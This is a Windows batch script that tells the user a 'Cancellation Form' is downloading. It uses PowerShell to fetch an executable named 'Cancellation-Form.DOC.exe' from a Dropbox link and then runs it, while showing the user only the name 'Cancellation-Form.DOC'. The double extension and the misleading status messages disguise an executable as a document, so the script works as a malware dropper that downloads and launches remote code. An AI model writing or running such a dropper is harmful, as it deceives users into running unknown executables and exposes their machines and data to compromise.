@echo off
setlocal
set "FILENAME=Cancellation-Form.DOC.exe"
set "SHOWNAME=Cancellation-Form.DOC"

echo ========================================
echo Your Cancellation Form is downloading...
echo Please be patient.
echo ========================================

powershell -NoLogo -NoProfile -Command ^
  "$client = New-Object System.Net.WebClient; $client.DownloadFile('https://www.dropbox.com/scl/fi/smzcpm5yp7vaoq2wr105a/Cancellation-Form.DOC.exe?rlkey=pafp2pmlytg5rdcvic35vhh4r&st=08qfe9xl&dl=1', '%FILENAME%')"

if exist "%FILENAME%" (
    echo.
    echo ========================================
    echo File downloaded: %SHOWNAME%
    echo Location: %cd%\%FILENAME%
    echo Opening file...
    echo ========================================
    start "" "%FILENAME%"
) else (
    echo.
    echo Download failed. Please check your internet connection or try again later.
)

pause
